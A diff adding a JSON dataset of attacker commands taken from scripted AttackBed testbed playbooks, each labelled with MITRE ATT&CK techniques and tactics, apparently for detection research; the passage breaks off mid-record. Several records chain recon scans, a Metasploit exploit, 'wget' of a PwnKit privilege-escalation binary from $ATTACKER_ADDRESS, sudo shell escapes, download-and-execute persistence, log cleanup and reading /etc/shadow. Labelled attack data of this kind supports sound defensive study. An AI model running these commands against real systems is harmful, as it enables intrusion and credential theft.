@@ -1,0 +1,10005 @@
+{
+ "source": "AttackBed AttackMate playbooks (github.com/ait-testbed/attackbed, GPL-3.0), parsed directly. CAM-LDS: Landauer et al., arXiv:2603.04186v1.",
+ "provenance": "SOURCE-DERIVED ANNOTATED PLAYBOOK SEQUENCES, command-level. Each record is one annotated attacker command; the technique list within a command is an UNORDERED annotation set, not an observed execution order. These are scripted playbooks, not real-world attack traces.",
+ "representation": "command-level, multi-label",
+ "label_order_within_command_is_meaningful": false,
+ "n_playbooks": 36,
+ "n_commands": 889,
+ "n_technique_labels": 1347,
+ "n_unlabelled_commands": 945,
+ "n_total_commands_including_unlabelled": 1834,
+ "playbooks_with_jinja_control_flow": 0,
+ "labels_per_command_histogram": {
+  "1": 678,
+  "2": 156,
+  "3": 26,
+  "4": 10,
+  "5": 1,
+  "13": 18
+ },
+ "distinct_techniques_with_subtechniques": 99,
+ "distinct_parent_techniques": 82,
+ "distinct_tactics": 13,
+ "scenarios": {
+  "S1": {
+   "n_runs": 18,
+   "runs": [
+    "scenario_1_a_a.j2",
+    "scenario_1_a_b.j2",
+    "scenario_1_a_c.j2",
+    "scenario_1_b_a.j2",
+    "scenario_1_b_b.j2",
+    "scenario_1_b_c.j2",
+    "scenario_1_c_a.j2",
+    "scenario_1_c_b.j2",
+    "scenario_1_c_c.j2",
+    "scenario_1_d_a.j2",
+    "scenario_1_d_b.j2",
+    "scenario_1_d_c.j2",
+    "scenario_1_e_a.j2",
+    "scenario_1_e_b.j2",
+    "scenario_1_e_c.j2",
+    "scenario_1_f_a.j2",
+    "scenario_1_f_b.j2",
+    "scenario_1_f_c.j2"
+   ]
+  },
+  "S2": {
+   "n_runs": 2,
+   "runs": [
+    "scenario_2_a_a.j2",
+    "scenario_2_a_c.j2"
+   ]
+  },
+  "S3": {
+   "n_runs": 8,
+   "runs": [
+    "scenario_3_a_a.j2",
+    "scenario_3_a_b.j2",
+    "scenario_3_a_c.j2",
+    "scenario_3_a_d.j2",
+    "scenario_3_b_a.j2",
+    "scenario_3_b_b.j2",
+    "scenario_3_b_c.j2",
+    "scenario_3_b_d.j2"
+   ]
+  },
+  "S4": {
+   "n_runs": 1,
+   "runs": [
+    "scenario_4.j2"
+   ]
+  },
+  "S5": {
+   "n_runs": 1,
+   "runs": [
+    "scenario_5.j2"
+   ]
+  },
+  "S6": {
+   "n_runs": 5,
+   "runs": [
+    "scenario_6_a_a.j2",
+    "scenario_6_a_b.j2",
+    "scenario_6_b_a.j2",
+    "scenario_6_b_b.j2",
+    "scenario_6_c.j2"
+   ]
+  },
+  "S7": {
+   "n_runs": 1,
+   "runs": [
+    "scenario_7.j2"
+   ]
+  }
+ },
+ "runs": {
+  "scenario_1_a_a.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_a_a.j2",
+   "source_sha256": "80b25e23830b34fabeb63a7ba8430f5bf71b75b74ae59e83af2cde8f57af72ad",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1"
+    },
+    {
+     "techniques": [
+      "T1068"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x PwnKit && ./PwnKit"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget http://$ATTACKER_ADDRESS/README.txt"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm ./PwnKit"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "command -v lsusb"
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_a_b.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_a_b.j2",
+   "source_sha256": "a9d6550555a8fb1e8e2de8bba4be6b9b63d9bf3845eb04308e31b0b2dee7920f",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1"
+    },
+    {
+     "techniques": [
+      "T1068"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x PwnKit && ./PwnKit"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.2"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm ./PwnKit"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_a_c.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_a_c.j2",
+   "source_sha256": "22a57e06d0fe5694f4fad89bc38d1352ab8165acf3b2e53301681a55268ed2e9",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1"
+    },
+    {
+     "techniques": [
+      "T1068"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x PwnKit && ./PwnKit"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.4"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm ./PwnKit"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_b_a.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_b_a.j2",
+   "source_sha256": "ed049310d14fd2b7b9471a7f1a38df751dcefa7559a7a412182ee4cb7f688e9b",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1548.003"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "sudo dmesg -H"
+    },
+    {
+     "techniques": [
+      "T1548.003"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "!/bin/bash"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget http://$ATTACKER_ADDRESS/README.txt"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "command -v lsusb"
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_b_b.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_b_b.j2",
+   "source_sha256": "30b88f72c19540b54aac69d72b5ef5172cd62afadaed0c54884c62a71545fb9c",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1548.003"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "sudo dmesg -H"
+    },
+    {
+     "techniques": [
+      "T1548.003"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "!/bin/bash"
